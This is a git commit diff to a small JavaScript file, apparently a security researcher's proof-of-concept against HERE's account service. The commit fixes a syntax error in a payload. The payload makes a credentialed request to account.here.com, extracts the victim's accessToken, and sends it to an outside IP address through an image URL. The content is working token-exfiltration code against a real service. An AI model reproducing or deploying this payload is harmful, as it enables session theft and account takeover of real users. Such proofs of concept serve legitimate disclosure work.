5b40bad4054ef8bda9a801194f92b3a111868ea8
Alexey Sintsov <alex.sintsov@gmail.com>
2019-10-22 15:56:13 +0200

    Update here.js

--- here.js
+++ here.js
@@ -2,7 +2,7 @@ var xhr = new XMLHttpRequest();
 xhr.open('GET', ' https://account.here.com/api/account?client-id=YQijV3hAPdxySAVtE6ZT&version=4&sdk=true&type=frame&uri=https%3A%2F%2Fplatform.here.com&sign-in-screen-config=password&no-sign-up=true&realm-input=true&frame-no-close=true&track-id=murloc', true);
 xhr.onload = function () {
 var i = document.createElement('img');
-i.src = 'http://34.245.80.122/olp.jpg?random='+JSON.parse(xhr.responseText).accessToken, true);
+i.src = 'http://34.245.80.122/olp.jpg?random='+JSON.parse(xhr.responseText).accessToken;
 document.head.appendChild(i);
 };
 xhr.withCredentials = true;
